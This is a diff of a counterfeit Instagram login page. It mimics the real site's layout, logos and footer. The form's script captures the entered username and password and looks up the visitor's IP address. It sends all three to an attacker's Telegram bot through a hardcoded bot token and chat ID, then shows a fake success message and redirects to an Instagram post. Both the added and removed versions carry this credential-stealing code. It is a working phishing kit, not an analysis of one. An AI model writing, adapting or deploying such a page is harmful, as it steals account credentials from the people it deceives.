@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNP-OH0_0b.png">
     <style>
         * {
             margin: 0;
@@ -24,19 +24,45 @@
 
         .container {
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            max-width: 350px;
             width: 100%;
+            max-width: 935px;
+            margin: 0 auto;
+        }
+
+        .phone-image {
+            margin-right: 32px;
+            position: relative;
+        }
+
+        .phone-image img {
+            width: 380px;
+            height: 580px;
+        }
+
+        .phone-screen {
+            position: absolute;
+            top: 26px;
+            left: 112px;
+            width: 250px;
+            height: 541px;
+            background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png');
+            background-size: cover;
+            background-position: center;
+            border-radius: 2px;
+        }
+
+        .login-container {
+            width: 350px;
         }
 
         .login-box {
             background-color: white;
             border: 1px solid #dbdbdb;
             padding: 20px 40px;
-            margin-bottom: 10px;
             text-align: center;
-            width: 100%;
+            margin-bottom: 10px;
         }
 
         .logo {
@@ -44,23 +70,22 @@
             width: 175px;
         }
 
-        .input-group {
-            margin-bottom: 6px;
-            position: relative;
+        .login-form {
+            margin-top: 24px;
         }
 
-        input {
+        .input-field {
             width: 100%;
             padding: 9px 0 7px 8px;
+            margin-bottom: 6px;
             background-color: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             font-size: 12px;
-            margin-bottom: 6px;
+            outline: none;
         }
 
-        input:focus {
-            outline: none;
+        .input-field:focus {
             border-color: #a8a8a8;
         }
 
@@ -71,14 +96,10 @@
             border: none;
             border-radius: 4px;
             padding: 7px 16px;
-            font-weight: 600;
             margin-top: 8px;
+            font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .login-button:hover {
-            background-color: #0081d6;
         }
 
         .login-button:disabled {
@@ -89,7 +110,7 @@
         .divider {
             display: flex;
             align-items: center;
-            margin: 15px 0;
+            margin: 18px 0;
         }
 
         .divider-line {
@@ -129,8 +150,7 @@
             border: 1px solid #dbdbdb;
             padding: 20px;
             text-align: center;
-            margin-bottom: 20px;
-            width: 100%;
+            margin-bottom: 10px;
         }
 
         .signup-text {
@@ -144,231 +164,188 @@
             text-decoration: none;
         }
 
-        .app-download {
+        .get-app {
             text-align: center;
-            width: 100%;
         }
 
-        .app-download-text {
+        .get-app-text {
             font-size: 14px;
             margin: 10px 0;
         }
 
-        .app-buttons {
+        .app-stores {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
         }
 
-        .app-button {
+        .app-store img {
             height: 40px;
-            cursor: pointer;
         }
 
         .footer {
-            margin-top: 50px;
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 20px 0;
             text-align: center;
-            color: #8e8e8e;
-            font-size: 12px;
         }
 
         .footer-links {
             display: flex;
-            justify-content: center;
             flex-wrap: wrap;
-            margin-bottom: 10px;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 16px;
         }
 
         .footer-link {
-            margin: 0 8px 10px;
             color: #8e8e8e;
+            font-size: 12px;
             text-decoration: none;
         }
 
-        .error-message {
-            color: #ed4956;
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        #message {
+            margin-top: 10px;
             font-size: 14px;
-            margin: 10px 0;
-            display: none;
+            text-align: center;
         }
 
-        .success-message {
-            color: #0095f6;
-            font-size: 14px;
-            margin: 10px 0;
-            display: none;
+        .success {
+            color: green;
         }
 
-        .loading {
-            display: none;
-            margin: 10px 0;
+        .error {
+            color: red;
         }
 
-        .loading-spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0095f6;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @media (max-width: 450px) {
-            .login-box {
-                background-color: transparent;
-                border: none;
-                padding: 20px;
-            }
-            
-            .signup-box {
-                background-color: transparent;
-                border: none;
+        @media (max-width: 875px) {
+            .phone-image {
+                display: none;
             }
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
-            
-            <form id="loginForm">
-                <div class="input-group">
-                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Password" required>
-                </div>
-                
-                <div class="error-message" id="errorMessage">
-                    Sorry, your password was incorrect. Please double-check your password.
-                </div>
-                
-                <div class="success-message" id="successMessage">
-                    Login successful! Redirecting...
-                </div>
-                
-                <div class="loading" id="loading">
-                    <div class="loading-spinner"></div>
-                </div>
-                
-                <button type="submit" class="login-button" id="loginButton">Log in</button>
-            </form>
-            
-            <div class="divider">
-                <div class="divider-line"></div>
-                <div class="divider-text">OR</div>
-                <div class="divider-line"></div>
-            </div>
-            
-            <div class="facebook-login">
-                <i class="fab fa-facebook-square"></i> Log in with Facebook
-            </div>
-            
-            <div class="forgot-password">Forgot password?</div>
+        <div class="phone-image">
+            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Instagram on phone">
+            <div class="phone-screen"></div>
         </div>
-        
-        <div class="signup-box">
-            <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        <div class="login-container">
+            <div class="login-box">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+                <form class="login-form" id="loginForm">
+                    <input type="text" class="input-field" id="username" placeholder="Phone number, username, or email" required>
+                    <input type="password" class="input-field" id="password" placeholder="Password" required>
+                    <button type="submit" class="login-button" id="loginButton">Log In</button>
+                </form>
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+                <div class="facebook-login">
+                    <i class="fab fa-facebook-square"></i> Log in with Facebook
+                </div>
+                <div class="forgot-password">Forgot password?</div>
+            </div>
+            <div class="signup-box">
+                <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p class="get-app-text">Get the app.</p>
+                <div class="app-stores">
+                    <div class="app-store">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on App Store">
+                    </div>
+                    <div class="app-store">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
+                    </div>
+                </div>
+            </div>
+            <div id="message"></div>
         </div>
-        
-        <div class="app-download">
-            <p class="app-download-text">Get the app.</p>
-            <div class="app-buttons">
-                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-button">
-                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-button">
-            </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Meta</a>
+            <a href="#" class="footer-link">About</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">Jobs</a>
+            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">API</a>
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">Terms</a>
+            <a href="#" class="footer-link">Locations</a>
+            <a href="#" class="footer-link">Instagram Lite</a>
+            <a href="#" class="footer-link">Threads</a>
+            <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+            <a href="#" class="footer-link">Meta Verified</a>
         </div>
-        
-        <div class="footer">
-            <div class="footer-links">
-                <a href="#" class="footer-link">Meta</a>
-                <a href="#" class="footer-link">About</a>
-                <a href="#" class="footer-link">Blog</a>
-                <a href="#" class="footer-link">Jobs</a>
-                <a href="#" class="footer-link">Help</a>
-                <a href="#" class="footer-link">API</a>
-                <a href="#" class="footer-link">Privacy</a>
-                <a href="#" class="footer-link">Terms</a>
-                <a href="#" class="footer-link">Top Accounts</a>
-                <a href="#" class="footer-link">Hashtags</a>
-                <a href="#" class="footer-link">Locations</a>
-                <a href="#" class="footer-link">Instagram Lite</a>
-                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
-            </div>
-            <div class="footer-links">
-                <a href="#" class="footer-link">English</a>
-                <a href="#" class="footer-link">© 2023 Instagram from Meta</a>
-            </div>
+        <div class="copyright">
+            © 2023 Instagram from Meta
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const loginButton = document.getElementById('loginButton');
+            const messageDiv = document.getElementById('message');
             
-            // Hide any previous messages
-            document.getElementById('errorMessage').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
+            // Disable login button
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
             
-            // Disable the login button
-            document.getElementById('loginButton').disabled = true;
-            
-            // Get user's IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    
-                    // Send data to Telegram bot
-                    const botToken = '8330554123:AAFkvvvZtcCZIjU20PgE11_2WkyKAr6kkNM';
-                    const chatId = '6957293275';
-                    const message = `New Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ip}`;
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                        }),
+            try {
+                // Get user's IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Send data to Telegram bot
+                const botToken = '8596151835:AAETvEBqIS0QCqCMWTFBehheGpLK1FYYXwM';
+                const chatId = '6957293275';
+                const text = `New Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIP}`;
+                
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text
                     })
-                    .then(response => response.json())
-                    .then(data => {
-                        // Show success message
-                        document.getElementById('loading').style.display = 'none';
-                        document.getElementById('successMessage').style.display = 'block';
-                        
-                        // Redirect to meme link after a short delay
-                        setTimeout(() => {
-                            window.location.href = 'https://www.instagram.com/_armeen_kaurr_/';
-                        }, 1500);
-                    })
-                    .catch(error => {
-                        console.error('Error sending to Telegram:', error);
-                        document.getElementById('loading').style.display = 'none';
-                        document.getElementById('errorMessage').style.display = 'block';
-                        document.getElementById('loginButton').disabled = false;
-                    });
-                })
-                .catch(error => {
-                    console.error('Error getting IP:', error);
-                    document.getElementById('loading').style.display = 'none';
-                    document.getElementById('errorMessage').style.display = 'block';
-                    document.getElementById('loginButton').disabled = false;
                 });
+                
+                if (telegramResponse.ok) {
+                    messageDiv.innerHTML = '<p class="success">Login successful! Redirecting...</p>';
+                    // Redirect to the specified Instagram post after successful "login"
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com/p/DQeWrSxjFCJ';
+                    }, 1500);
+                } else {
+                    throw new Error('Failed to send message to Telegram');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                messageDiv.innerHTML = '<p class="error">Login failed. Please try again.</p>';
+            } finally {
+                // Re-enable login button
+                loginButton.disabled = false;
+                loginButton.textContent = 'Log In';
+            }
         });
     </script>
 </body>
